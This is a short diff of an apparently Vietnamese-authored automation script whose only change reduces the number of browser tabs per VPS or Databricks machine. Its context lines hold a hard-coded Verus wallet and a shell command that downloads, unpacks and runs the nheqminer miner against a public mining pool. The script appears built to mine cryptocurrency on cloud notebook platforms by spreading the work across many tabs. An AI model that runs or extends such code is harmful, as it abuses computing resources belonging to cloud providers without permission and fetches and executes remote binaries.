@@ -22,7 +22,7 @@ print('''
                                                            Not my Idea at all
   ###########################################################################
   ''')
-multitab = 8 # vps4-8 chay 20 chrome, vps databricks 2-10 chay max 5-10tab
+multitab = 6 # vps4-8 chay 20 chrome, vps databricks 2-10 chay max 5-10tab
 wallet   ="RDD9mUShEa4WU894zdknpkZJnLbLeWMXf4"
 worker   =".Cloud-DB"
 scriptmining= "!wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tar.gz && ./nheqminer/nheqminer -v -l eu.luckpool.net:3960 -u "+wallet+worker+" -p x -t 2"
